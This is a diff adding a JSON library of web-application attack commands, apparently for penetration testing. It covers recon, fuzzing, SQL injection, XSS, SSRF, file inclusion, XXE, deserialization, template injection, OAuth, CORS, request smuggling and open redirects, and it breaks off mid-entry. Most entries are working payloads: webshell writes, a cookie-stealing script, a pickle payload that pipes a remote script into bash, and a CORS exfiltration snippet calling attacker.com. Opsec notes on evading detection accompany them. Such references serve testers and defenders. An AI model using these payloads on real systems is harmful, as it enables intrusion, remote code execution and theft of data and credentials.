@@ -1,0 +1,1684 @@
+{
+  "recon_enum": {
+    "description": "Passive and active reconnaissance of web applications.",
+    "commands": [
+      {
+        "description": "Subdomain enumeration with subfinder.",
+        "method": "subfinder",
+        "command": "subfinder -d {domain} -o subdomains.txt"
+      },
+      {
+        "description": "DNS brute force with dnsx.",
+        "method": "dnsx",
+        "command": "dnsx -l subdomains.txt -o resolved.txt -a -resp"
+      },
+      {
+        "description": "Technology fingerprinting with whatweb.",
+        "method": "whatweb",
+        "command": "whatweb -a 3 {url}"
+      },
+      {
+        "description": "Crawl and collect all URLs with katana.",
+        "method": "katana",
+        "command": "katana -u {url} -d 5 -o urls.txt"
+      },
+      {
+        "description": "Find exposed endpoints with gau.",
+        "method": "gau",
+        "command": "gau {domain} | tee gau_output.txt"
+      },
+      {
+        "description": "WHOIS lookup for domain registration info.",
+        "method": "whois",
+        "command": "whois {domain}"
+      },
+      {
+        "description": "DNS A record lookup with dig.",
+        "method": "dig",
+        "command": "dig {domain} A"
+      },
+      {
+        "description": "DNS zone transfer attempt.",
+        "method": "dig",
+        "command": "dig @{nameserver} {domain} axfr"
+      },
+      {
+        "description": "DNS ANY record query.",
+        "method": "dig",
+        "command": "dig any {domain} @{nameserver}"
+      },
+      {
+        "description": "Subdomain brute-force with dnsenum.",
+        "method": "dnsenum",
+        "command": "dnsenum {domain} -f subdomains.txt"
+      },
+      {
+        "description": "Certificate Transparency subdomain discovery.",
+        "method": "curl",
+        "command": "curl -s 'https://crt.sh/?q=%.{domain}&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u"
+      },
+      {
+        "description": "Virtual host discovery with gobuster.",
+        "method": "gobuster",
+        "command": "gobuster vhost -u http://{target_ip} -w {hostnames_wordlist}"
+      },
+      {
+        "description": "Google dorks for sensitive info.",
+        "method": "Manual",
+        "command": "site:{domain} filetype:pdf\nsite:{domain} inurl:admin\nsite:{domain} intitle:'index of' /backup"
+      }
+    ],
+    "mitre": "T1592",
+    "prerequisites": "Target domain; internet access; enumeration tools (ffuf, amass, hakrawler)",
+    "opsec": "Passive recon (crt.sh, OSINT) leaves no trace. Active scanning with ffuf generates server-side logs. Use rate limiting to avoid WAF blocks.",
+    "detection_ref": "WAF rate limiting and IP blocking; anomalous request patterns; access log monitoring; web honeypots"
+  },
+  "web_fuzzing": {
+    "description": "Directory, file, and parameter fuzzing.",
+    "commands": [
+      {
+        "description": "Directory and file fuzzing with ffuf.",
+        "method": "ffuf",
+        "command": "ffuf -u {url}/FUZZ -w {wordlist} -mc 200,301,302,403"
+      },
+      {
+        "description": "Virtual host fuzzing with ffuf.",
+        "method": "ffuf",
+        "command": "ffuf -w {wordlist} -u {url} -H 'Host: FUZZ.{domain}' -mc 200"
+      },
+      {
+        "description": "Parameter fuzzing with ffuf.",
+        "method": "ffuf",
+        "command": "ffuf -u '{url}?FUZZ=value' -w {wordlist} -mc 200"
+      },
+      {
+        "description": "Directory brute force with gobuster.",
+        "method": "gobuster",
+        "command": "gobuster dir -u {url} -w {wordlist} -x php,html,txt,bak"
+      },
+      {
+        "description": "API endpoint fuzzing with feroxbuster.",
+        "method": "feroxbuster",
+        "command": "feroxbuster -u {url} -w {wordlist} --depth 3 -x json"
+      },
+      {
+        "description": "Extension fuzzing to discover file types.",
+        "method": "ffuf",
+        "command": "ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u {url}/indexFUZZ"
+      },
+      {
+        "description": "Page fuzzing for specific extension.",
+        "method": "ffuf",
+        "command": "ffuf -w {wordlist}:FUZZ -u {url}/blog/FUZZ.php"
+      },
+      {
+        "description": "Recursive fuzzing with extension.",
+        "method": "ffuf",
+        "command": "ffuf -w {wordlist}:FUZZ -u {url}/FUZZ -recursion -recursion-depth 1 -e .php -v"
+      },
+      {
+        "description": "Subdomain fuzzing.",
+        "method": "ffuf",
+        "command": "ffuf -w {wordlist}:FUZZ -u https://FUZZ.{domain}/"
+      },
+      {
+        "description": "GET parameter value fuzzing.",
+        "method": "ffuf",
+        "command": "ffuf -w ids.txt:FUZZ -u {url}/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs {size}"
+      }
+    ],
+    "mitre": "T1595.003",
+    "prerequisites": "Target URL; wordlist; fuzzing tool (ffuf, gobuster, wfuzz)",
+    "opsec": "Directory fuzzing generates high request volume — easily detected. Use low-thread, slower scans. Target specific paths based on tech fingerprint.",
+    "detection_ref": "WAF rate limiting; 404 response rate monitoring; anomalous request pattern detection; access log analysis"
+  },
+  "sql_injection": {
+    "description": "Testing and exploiting SQL injection vulnerabilities.",
+    "commands": [
+      {
+        "description": "Automated SQLi detection and exploitation.",
+        "method": "sqlmap",
+        "command": "sqlmap -u '{url}?id=1' --batch --dbs"
+      },
+      {
+        "description": "SQLi via POST request.",
+        "method": "sqlmap",
+        "command": "sqlmap -u {url} --data '{post_data}' --batch --dbs"
+      },
+      {
+        "description": "SQLi with cookie-based authentication.",
+        "method": "sqlmap",
+        "command": "sqlmap -u {url} --cookie='{cookie}' --batch --dbs"
+      },
+      {
+        "description": "Dump a specific database.",
+        "method": "sqlmap",
+        "command": "sqlmap -u {url} -D {database} --tables --batch"
+      },
+      {
+        "description": "Dump a specific table.",
+        "method": "sqlmap",
+        "command": "sqlmap -u {url} -D {database} -T {table} --dump --batch"
+      },
+      {
+        "description": "SQLi time-based blind manual payload.",
+        "method": "curl",
+        "command": "curl '{url}?id=1 AND SLEEP(5)--'  # MySQL; for PostgreSQL: pg_sleep(5); for MSSQL: WAITFOR DELAY '0:0:5'"
+      },
+      {
+        "description": "SQLi UNION-based column count discovery.",
+        "method": "curl",
+        "command": "curl '{url}?id=1 ORDER BY 1--' # Increment until error; then: UNION SELECT NULL,NULL,NULL--"
+      },
+      {
+        "description": "SQLmap with WAF bypass tamper scripts.",
+        "method": "sqlmap",
+        "command": "sqlmap -u '{url}?id=1' --tamper=space2comment,between,charencode --random-agent --level=5 --risk=3 --batch"
+      },
+      {
+        "description": "SQLi to OS command execution via xp_cmdshell (MSSQL).",
+        "method": "sqlmap",
+        "command": "sqlmap -u '{url}?id=1' --os-shell --dbms=mssql --batch"
+      },
+      {
+        "description": "SQLi via second-order injection — inject then trigger in another function.",
+        "method": "Manual",
+        "command": "# Register username: admin'-- (stored in DB) — when username used in another query unsanitized, injection fires"
+      },
+      {
+        "description": "Auth bypass payload — basic OR injection.",
+        "method": "Manual",
+        "command": "# Username: admin' or '1'='1\n# Username: admin')-- -"
+      },
+      {
+        "description": "Detect column count with ORDER BY.",
+        "method": "Manual",
+        "command": "# Inject: ' order by 1-- -  (increment until error)"
+      },
+      {
+        "description": "UNION-based column detection.",
+        "method": "Manual",
+        "command": "# Inject: cn' UNION select 1,2,3-- -"
+      },
+      {
+        "description": "UNION injection to get DB version.",
+        "method": "Manual",
+        "command": "cn' UNION select 1,@@version,3,4-- -"
+      },
+      {
+        "description": "Get current database name.",
+        "method": "Manual",
+        "command": "cn' UNION select 1,database(),2,3-- -"
+      },
+      {
+        "description": "List all databases via INFORMATION_SCHEMA.",
+        "method": "Manual",
+        "command": "cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -"
+      },
+      {
+        "description": "List all tables in specific database.",
+        "method": "Manual",
+        "command": "cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -"
+      },
+      {
+        "description": "List columns in specific table.",
+        "method": "Manual",
+        "command": "cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -"
+      },
+      {
+        "description": "Find current MySQL user.",
+        "method": "Manual",
+        "command": "cn' UNION SELECT 1, user(), 3, 4-- -"
+      },
+      {
+        "description": "Check if current user has DBA/super privileges.",
+        "method": "Manual",
+        "command": "cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user='root'-- -"
+      },
+      {
+        "description": "Check secure_file_priv directory for file read/write.",
+        "method": "Manual",
+        "command": "cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name='secure_file_priv'-- -"
+      },
+      {
+        "description": "Read local file via SQLi LOAD_FILE.",
+        "method": "Manual",
+        "command": "cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -"
+      },
+      {
+        "description": "Write PHP webshell via SQLi INTO OUTFILE.",
+        "method": "Manual",
+        "command": "cn' union select '',\"<?php system($_REQUEST[0]); ?>\", \"\", \"\" into outfile '/var/www/html/shell.php'-- -"
+      },
+      {
+        "description": "sqlmap with anti-CSRF token bypass.",
+        "method": "sqlmap",
+        "command": "sqlmap -u '{url}' --data='id=1&csrf-token=abc' --csrf-token='csrf-token'"
+      },
+      {
+        "description": "sqlmap — list all tamper scripts.",
+        "method": "sqlmap",
+        "command": "sqlmap --list-tampers"
+      },
+      {
+        "description": "sqlmap — read local file.",
+        "method": "sqlmap",
+        "command": "sqlmap -u '{url}?id=1' --file-read '/etc/passwd'"
+      },
+      {
+        "description": "sqlmap — write webshell to server.",
+        "method": "sqlmap",
+        "command": "sqlmap -u '{url}?id=1' --file-write 'shell.php' --file-dest '/var/www/html/shell.php'"
+      },
+      {
+        "description": "sqlmap — password enumeration and cracking.",
+        "method": "sqlmap",
+        "command": "sqlmap -u '{url}?id=1' --passwords --batch"
+      },
+      {
+        "description": "sqlmap — database schema enumeration.",
+        "method": "sqlmap",
+        "command": "sqlmap -u '{url}?id=1' --schema"
+      },
+      {
+        "description": "sqlmap — check for DBA privileges.",
+        "method": "sqlmap",
+        "command": "sqlmap -u '{url}?id=1' --is-dba"
+      }
+    ],
+    "mitre": "T1190",
+    "prerequisites": "SQL query input point; lack of parameterized queries or input validation",
+    "opsec": "Manual SQLi is less noisy than automated tools. Avoid OR 1=1 payloads — very common IDS signature. Use time-based blind for stealthy extraction.",
+    "detection_ref": "WAF signatures; IDS SQL injection patterns; Database activity monitoring; anomalous query patterns in DB logs"
+  },
+  "xss": {
+    "description": "Testing and exploiting Cross-Site Scripting vulnerabilities.",
+    "commands": [
+      {
+        "description": "Reflected XSS detection with dalfox.",
+        "method": "dalfox",
+        "command": "dalfox url '{url}?param=value'"
+      },
+      {
+        "description": "XSS scan on multiple URLs.",
+        "method": "dalfox",
+        "command": "cat urls.txt | dalfox pipe"
+      },
+      {
+        "description": "Blind XSS with XSShunter payload.",
+        "method": "Manual",
+        "command": "\"><script src=https://yourxsshunter.xss.ht></script>"
+      },
+      {
+        "description": "DOM-based XSS via URL hash fragment.",
+        "method": "Manual",
+        "command": "# Navigate to: {url}#<img src=x onerror=alert(document.cookie)> if app writes location.hash to innerHTML"
+      },
+      {
+        "description": "Stored XSS via SVG file upload.",
+        "method": "curl",
+        "command": "curl -X POST {url}/upload -F 'file=@xss.svg;type=image/svg+xml' # xss.svg: <svg><script>alert(document.cookie)</script></svg>"
+      },
+      {
+        "description": "CSP bypass via JSONP callback on allowed domain.",
+        "method": "Manual",
+        "command": "# If CSP allows trusted.com: <script src='https://trusted.com/api?callback=alert(1)'></script>"
+      },
+      {
+        "description": "mXSS (mutation XSS) via innerHTML sanitizer bypass.",
+        "method": "Manual",
+        "command": "# Submit: <noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"> — sanitizer may miss mutation on DOM insertion"
+      },
+      {
+        "description": "Run xsstrike automated XSS testing.",
+        "method": "xsstrike",
+        "command": "python xsstrike.py -u '{url}?task=test'"
+      },
+      {
+        "description": "Cookie stealing XSS payload.",
+        "method": "Manual",
+        "command": "<script>new Image().src='http://{lhost}/index.php?c='+document.cookie</script>"
+      },
+      {
+        "description": "Change website background via XSS.",
+        "method": "Manual",
+        "command": "<script>document.body.style.background = '#141d2b'</script>"
+      },
+      {
+        "description": "Overwrite main body content via XSS.",
+        "method": "Manual",
+        "command": "<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>"
+      }
+    ],
+    "mitre": "T1059.007",
+    "prerequisites": "Input reflected in response without sanitization; target user interaction (stored/reflected) or DOM-based execution",
+    "opsec": "Use obfuscated payloads to bypass WAF. For stored XSS, payload executes when victim visits page — target high-value admin users.",
+    "detection_ref": "WAF XSS detection rules; CSP implementation; browser-side XSS Auditor (deprecated) / Trusted Types"
+  },
+  "ssrf": {
+    "description": "Testing Server-Side Request Forgery vulnerabilities.",
+    "commands": [
+      {
+        "description": "Basic SSRF to internal metadata endpoint.",
+        "method": "curl",
+        "command": "curl '{url}?url=http://169.254.169.254/latest/meta-data/'"
+      },
+      {
+        "description": "SSRF with Gopher protocol.",
+        "method": "curl",
+        "command": "curl '{url}?url=gopher://127.0.0.1:6379/_PING'"
+      },
+      {
+        "description": "Blind SSRF detection with interactsh.",
+        "method": "interactsh-client",
+        "command": "interactsh-client -v | grep {your_interactsh_id}"
+      },
+      {
+        "description": "SSRF to probe internal network.",
+        "method": "ffuf",
+        "command": "ffuf -u '{url}?url=http://192.168.1.FUZZ' -w <(seq 1 254) -mc 200"
+      },
+      {
+        "description": "SSRF filter bypass via decimal IP notation.",
+        "method": "curl",
+        "command": "curl '{url}?url=http://2130706433/'  # 2130706433 = 127.0.0.1 in decimal"
+      },
+      {
+        "description": "SSRF filter bypass via IPv6 localhost.",
+        "method": "curl",
+        "command": "curl '{url}?url=http://[::1]/' && curl '{url}?url=http://[::ffff:127.0.0.1]/'"
+      },
+      {
+        "description": "SSRF bypass via DNS rebinding (use rbndr.us or similar).",
+        "method": "Manual",
+        "command": "# Register domain that resolves to attacker then flips to 127.0.0.1: use rbndr.us/{public_ip}/{private_ip}"
+      },
+      {
+        "description": "SSRF via redirect — host redirect from public to internal.",
+        "method": "Python",
+        "command": "# Python redirect server: from http.server import BaseHTTPRequestHandler,HTTPServer; class H(BaseHTTPRequestHandler): def do_GET(self): self.send_response(301); self.send_header('Location','http://169.254.169.254/latest/meta-data/'); self.end_headers()"
+      }
+    ],
+    "mitre": "T1090.002",
+    "prerequisites": "Server-side URL fetch functionality (webhooks, file imports, proxy features); internal network accessible from server",
+    "opsec": "Use DNS rebinding or SSRF to reach cloud metadata services. Chain with IDOR for higher impact. Try alternate encodings to bypass SSRF filters.",
+    "detection_ref": "Outbound request monitoring; metadata endpoint access logging; WAF SSRF detection; network egress filtering"
+  },
+  "lfi_rfi": {
+    "description": "Testing Local and Remote File Inclusion vulnerabilities.",
+    "commands": [
+      {
+        "description": "Basic LFI test.",
+        "method": "curl",
+        "command": "curl '{url}?page=../../../../etc/passwd'"
+      },
+      {
+        "description": "LFI with null byte bypass.",
+        "method": "curl",
+        "command": "curl '{url}?page=../../../../etc/passwd%00'"
+      },
+      {
+        "description": "LFI log poisoning via User-Agent.",
+        "method": "curl",
+        "command": "curl -A '<?php system($_GET[\"cmd\"]); ?>' {url} && curl '{url}?page=/var/log/apache2/access.log&cmd=id'"
+      },
+      {
+        "description": "Automated LFI scanning with ffuf.",
+        "method": "ffuf",
+        "command": "ffuf -u '{url}?page=FUZZ' -w lfi_wordlist.txt -mc 200"
+      },
+      {
+        "description": "Read PHP source code via base64 filter wrapper.",
+        "method": "curl",
+        "command": "curl '{url}?page=php://filter/read=convert.base64-encode/resource=config'"
+      },
+      {
+        "description": "RCE via PHP data wrapper (base64 encoded webshell).",
+        "method": "curl",
+        "command": "curl '{url}?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'"
+      },
+      {
+        "description": "RCE via PHP input wrapper (POST body).",
+        "method": "curl",
+        "command": "curl -s -X POST --data '<?php system($_GET[\"cmd\"]); ?>' '{url}?language=php://input&cmd=id'"
+      },
+      {
+        "description": "RCE via PHP expect wrapper.",
+        "method": "curl",
+        "command": "curl -s '{url}?language=expect://id'"
+      },
+      {
+        "description": "RFI — host PHP webshell and include remotely.",
+        "method": "shell",
+        "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php && python3 -m http.server {port}\n# Then: {url}?language=http://{lhost}:{port}/shell.php&cmd=id"
+      },
+      {
+        "description": "LFI + upload via malicious GIF image.",
+        "method": "shell",
+        "command": "echo 'GIF8<?php system($_GET[\"cmd\"]); ?>' > shell.gif\n# Include: {url}?language=./profile_images/shell.gif&cmd=id"
+      },
+      {
+        "description": "LFI + upload via ZIP file (zip:// wrapper).",
+        "method": "shell",
+        "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php && zip shell.jpg shell.php\n# Include: {url}?language=zip://shell.zip%23shell.php&cmd=id"
+      },
+      {
+        "description": "LFI + upload via PHAR file.",
+        "method": "shell",
+        "command": "php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg\n# Include: {url}?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id"
+      },
+      {
+        "description": "Log poisoning via Apache access log.",
+        "method": "curl",
+        "command": "curl -s '{url}' -A '<?php system($_GET[\"cmd\"]); ?>'\n# Then: {url}?language=/var/log/apache2/access.log&cmd=id"
+      },
+      {
+        "description": "Log poisoning via PHP session file.",
+        "method": "curl",
+        "command": "curl '{url}?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E'\n# Then: {url}?language=/var/lib/php/sessions/sess_{session_id}&cmd=id"
+      },
+      {
+        "description": "Fuzz LFI payloads with ffuf.",
+        "method": "ffuf",
+        "command": "ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u '{url}?language=FUZZ' -fs {default_size}"
+      },
+      {
+        "description": "Fuzz web root paths for LFI.",
+        "method": "ffuf",
+        "command": "ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u '{url}?language=../../../../FUZZ/index.php' -fs {default_size}"
+      },
+      {
+        "description": "LFI bypass with double slash path traversal filter bypass.",
+        "method": "curl",
+        "command": "curl '{url}?page=....//....//....//....//etc/passwd'"
+      }
+    ],
+    "mitre": "T1059",
+    "prerequisites": "File inclusion via user-controlled path; path traversal not blocked; for RFI: allow_url_include enabled (PHP)",
+    "opsec": "LFI via /proc/self/fd/ and log poisoning for RCE. Null byte termination for PHP < 5.3. Use encoding to bypass path filters.",
+    "detection_ref": "WAF path traversal signatures; file access monitoring for /etc/passwd, /proc/; web server access log anomalies"
+  },
+  "api_testing": {
+    "description": "Testing REST and GraphQL APIs for vulnerabilities.",
+    "commands": [
+      {
+        "description": "Brute force API endpoints.",
+        "method": "ffuf",
+        "command": "ffuf -u {url}/api/FUZZ -w api_wordlist.txt -mc 200,201,401,403"
+      },
+      {
+        "description": "Introspect a GraphQL schema.",
+        "method": "curl",
+        "command": "curl -X POST {url}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'"
+      },
+      {
+        "description": "JWT none algorithm attack.",
+        "method": "Manual",
+        "command": "python3 -c \"import base64,json; h=base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode(); p=base64.b64encode(json.dumps({'sub':'admin'}).encode()).decode(); print(f'{h}.{p}.')\""
+      },
+      {
+        "description": "JWT secret brute force.",
+        "method": "hashcat",
+        "command": "hashcat -m 16500 {jwt_token} {wordlist}"
+      }
+    ],
+    "mitre": "T1595",
+    "prerequisites": "API endpoint; authentication token; API documentation or discovered schema",
+    "opsec": "Use API docs/Swagger to avoid blind fuzzing. Test individual endpoints methodically vs mass fuzzing. Use valid tokens to blend with normal traffic.",
+    "detection_ref": "API gateway rate limiting; anomalous endpoint access patterns; authentication failure monitoring; API inventory enforcement"
+  },
+  "xxe_injection": {
+    "description": "Testing and exploiting XML External Entity injection vulnerabilities.",
+    "commands": [
+      {
+        "description": "Basic XXE to read /etc/passwd.",
+        "method": "curl",
+        "command": "curl -X POST {url} -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'"
+      },
+      {
+        "description": "XXE via SVG file upload.",
+        "method": "Manual",
+        "command": "# Upload SVG: <?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><svg><text>&xxe;</text></svg>"
+      },
+      {
+        "description": "Blind XXE via out-of-band DNS exfil.",
+        "method": "Manual",
+        "command": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{attacker_interactsh_url}/{exfil_data}\">]><foo>&xxe;</foo>"
+      },
+      {
+        "description": "XXE via SSRF to cloud metadata.",
+        "method": "curl",
+        "command": "curl -X POST {url}/parse -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><foo>&xxe;</foo>'"
+      },
+      {
+        "description": "XXE via PHP expect wrapper for RCE.",
+        "method": "curl",
+        "command": "curl -X POST {url} -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>'"
+      }
+    ],
+    "mitre": "T1059",
+    "prerequisites": "XML input accepted by application; XML parser with external entity processing enabled",
+    "opsec": "Blind XXE via DNS/HTTP OOB is the most common real-world scenario. Use Burp Collaborator for OOB detection. Error-based XXE for direct output.",
+    "detection_ref": "WAF XXE signatures; XML parser configuration hardening (disable DTD/external entities); SAST tools detecting unsafe XML parsing"
+  },
+  "deserialization": {
+    "description": "Exploiting insecure deserialization vulnerabilities in web applications.",
+    "commands": [
+      {
+        "description": "Generate Java deserialization payload with ysoserial.",
+        "method": "ysoserial",
+        "command": "java -jar ysoserial.jar CommonsCollections6 'curl http://{lhost}/{token}' | base64 -w0"
+      },
+      {
+        "description": "Test Java deserialization endpoint via Burp.",
+        "method": "Manual",
+        "command": "# Identify base64-encoded Java serialized object: starts with rO0AB — replace with ysoserial payload"
+      },
+      {
+        "description": "PHP deserialization — inject serialized object with magic methods.",
+        "method": "Manual",
+        "command": "# php -r 'echo serialize(new VulnClass());' — look for __wakeup, __destruct, __toString magic methods for gadget chains"
+      },
+      {
+        "description": "Python pickle deserialization RCE payload.",
+        "method": "Python",
+        "command": "import pickle,os; class E(object):\n  def __reduce__(self): return (os.system,('curl http://{lhost}/shell.sh|bash',))\nprint(pickle.dumps(E()))"
+      },
+      {
+        "description": ".NET deserialization with ysoserial.net.",
+        "method": "ysoserial.net",
+        "command": "ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c 'cmd /c whoami'"
+      }
+    ],
+    "mitre": "T1059",
+    "prerequisites": "Application deserializing user-controlled data; vulnerable library/gadget chain in classpath",
+    "opsec": "Use ysoserial for Java, pickle exploit for Python, viewstate for .NET. OOB DNS confirmation for blind RCE. Single-payload interaction.",
+    "detection_ref": "RASP for deserialization monitoring; library patching; input validation; deserialization gadget chain detection via SAST"
+  },
+  "template_injection": {
+    "description": "Testing and exploiting Server-Side Template Injection (SSTI) vulnerabilities.",
+    "commands": [
+      {
+        "description": "Detect SSTI with polyglot probe.",
+        "method": "Manual",
+        "command": "Submit: ${{<%[%'\"}}%\\  — watch for template parse errors or math evaluation"
+      },
+      {
+        "description": "Jinja2 SSTI RCE payload (Python/Flask).",
+        "method": "Manual",
+        "command": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+      },
+      {
+        "description": "Twig SSTI RCE payload (PHP).",
+        "method": "Manual",
+        "command": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+      },
+      {
+        "description": "FreeMarker SSTI RCE payload (Java).",
+        "method": "Manual",
+        "command": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+      },
+      {
+        "description": "Automated SSTI detection and exploitation with tplmap.",
+        "method": "tplmap",
+        "command": "python3 tplmap.py -u '{url}?name=*' --os-shell"
+      }
+    ],
+    "mitre": "T1059",
+    "prerequisites": "Server-side template engine rendering user input; unsandboxed template context",
+    "opsec": "SSTI test: {{7*7}} → 49 confirms injection. One request to confirm, then targeted RCE payload. Error messages reveal template engine type.",
+    "detection_ref": "Template sandbox enforcement; input sanitization; WAF SSTI signatures; template engine security configurations"
+  },
+  "oauth_oidc_attacks": {
+    "description": "Testing OAuth 2.0 and OpenID Connect implementations for common vulnerabilities.",
+    "commands": [
+      {
+        "description": "OAuth state parameter CSRF — check if state is validated.",
+        "method": "Manual",
+        "command": "# Remove or reuse state parameter in authorization callback: GET /callback?code={code}&state=reused — if accepted, state is not validated"
+      },
+      {
+        "description": "OAuth redirect_uri manipulation.",
+        "method": "Manual",
+        "command": "# Append to allowed URI: ?redirect_uri=https://legit.com.evil.com or https://legit.com/path/../../../evil.com"
+      },
+      {
+        "description": "Authorization code interception via Referer header leak.",
+        "method": "Manual",
+        "command": "# Add a resource on callback page that sends Referer header: attacker iframe src + check server logs for authorization code in Referer"
+      },
+      {
+        "description": "OAuth implicit flow token leakage via fragment.",
+        "method": "Manual",
+        "command": "# Replace response_type=code with response_type=token — if allowed, access token appears in URL fragment accessible to JS"
+      },
+      {
+        "description": "PKCE downgrade — remove code_challenge from request.",
+        "method": "Manual",
+        "command": "# Remove code_challenge and code_challenge_method from authorization request — if server doesn't enforce PKCE, proceed without it"
+      }
+    ],
+    "mitre": "T1550.001",
+    "prerequisites": "OAuth2/OIDC implementation; redirect URI, state, or PKCE weakness present",
+    "opsec": "Open redirect for token theft requires victim interaction. State bypass CSRF works in single crafted URL. PKCE downgrade if server allows it.",
+    "detection_ref": "Strict redirect URI allowlisting; state parameter enforcement; PKCE required for public clients; OAuth security audit"
+  },
+  "cors_misconfiguration": {
+    "description": "Detecting and exploiting Cross-Origin Resource Sharing misconfigurations.",
+    "commands": [
+      {
+        "description": "Test CORS with arbitrary origin.",
+        "method": "curl",
+        "command": "curl -H 'Origin: https://evil.com' -I {url}/api/user-data | grep -i 'Access-Control'"
+      },
+      {
+        "description": "Test null origin CORS bypass.",
+        "method": "curl",
+        "command": "curl -H 'Origin: null' {url}/api/profile | grep -i 'access-control-allow-origin'"
+      },
+      {
+        "description": "Test subdomain origin reflection.",
+        "method": "curl",
+        "command": "curl -H 'Origin: https://attacker.{target_domain}' {url}/api/secret | grep 'Access-Control-Allow-Origin'"
+      },
+      {
+        "description": "Exploit CORS misconfiguration — steal sensitive data via JS.",
+        "method": "Manual",
+        "command": "// Host on attacker.com: fetch('https://vulnerable.com/api/data',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/steal?d='+btoa(d)))"
+      },
+      {
+        "description": "Automated CORS misconfiguration scanner.",
+        "method": "CORScanner",
+        "command": "python3 cors_scan.py -u {url} -v"
+      }
+    ],
+    "mitre": "T1190",
+    "prerequisites": "CORS policy allowing arbitrary origins or null origin; authenticated endpoint with sensitive data",
+    "opsec": "CORS exploitation requires victim to visit attacker page. Single-interaction attack. Test with Origin: null for cache poisoning combined attacks.",
+    "detection_ref": "CORS policy review — avoid wildcards with credentials; explicit origin allowlists; preflight request auditing"
+  },
+  "http_request_smuggling": {
+    "description": "Testing and exploiting HTTP request smuggling vulnerabilities.",
+    "commands": [
+      {
+        "description": "Detect CL.TE request smuggling with timing attack.",
+        "method": "curl",
+        "command": "curl -X POST {url} -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' -d $'1\\r\\nZ\\r\\n0\\r\\n\\r\\n'"
+      },
+      {
+        "description": "TE.CL smuggling probe.",
+        "method": "Manual",
+        "command": "POST / HTTP/1.1\\r\\nHost: {target}\\r\\nContent-Length: 3\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n8\\r\\nSMUGGLED\\r\\n0\\r\\n\\r\\n"
+      },
+      {
+        "description": "HTTP/2 downgrade smuggling (H2.CL).",
+        "method": "Manual",
+        "command": "# Use h2c or Burp HTTP/2 tab — send H2 request with Content-Length header (H2 doesn't use CL — causes frontend/backend desync)"
+      },
+      {
+        "description": "Automated request smuggling detection with smuggler.py.",
+        "method": "smuggler",
+        "command": "python3 smuggler.py -u {url}"
+      },
+      {
+        "description": "Use Burp HTTP Request Smuggler extension for automated detection.",
+        "method": "Burp",
+        "command": "# Burp > Extensions > HTTP Request Smuggler > Actively scan target for CL.TE and TE.CL variants"
+      }
+    ],
+    "mitre": "T1190",
+    "prerequisites": "HTTP/1.1 with proxy/load balancer; Content-Length/Transfer-Encoding desync vulnerability",
+    "opsec": "Request smuggling is difficult to detect in real-time. CL.TE and TE.CL variants. Use Burp Suite HTTP Request Smuggler for automated detection.",
+    "detection_ref": "HTTP/2 enforcement; normalize Transfer-Encoding handling; consistent header parsing across proxy/backend; Burp audit for smuggling"
+  },
+  "open_redirect": {
+    "description": "Detecting and exploiting open redirect vulnerabilities for phishing and OAuth abuse.",
+    "commands": [
+      {
+        "description": "Basic open redirect test.",
+        "method": "curl",
+        "command": "curl -I '{url}?url=https://evil.com' | grep Location"
+      },
+      {
+        "description": "Open redirect with URL encoding bypass.",
+        "method": "curl",
+        "command": "curl -I '{url}?redirect=https%3A%2F%2Fevil.com'"
+      },
+      {
+        "description": "Open redirect via double slash (protocol-relative URL).",
+        "method": "Manual",
+        "command": "GET /redirect?url=//evil.com — browser treats as https://evil.com"
+      },
+      {
+        "description": "Open redirect bypass via @ character.",
+        "method": "Manual",
+        "command": "GET /redir?to=https://trusted.com@evil.com — browser parses evil.com as host"
+      },
+      {
+        "description": "Chained open redirect for OAuth token theft.",
+        "method": "Manual",
+        "command": "# If app allows redirect_uri=https://legit.com/redirect?url=X, chain: redirect_uri=https://legit.com/redirect?url=https://attacker.com — code sent to attacker"
+      }
+    ],
+    "mitre": "T1190",
+    "prerequisites": "URL redirect parameter not validated against allowlist; phishing infrastructure",
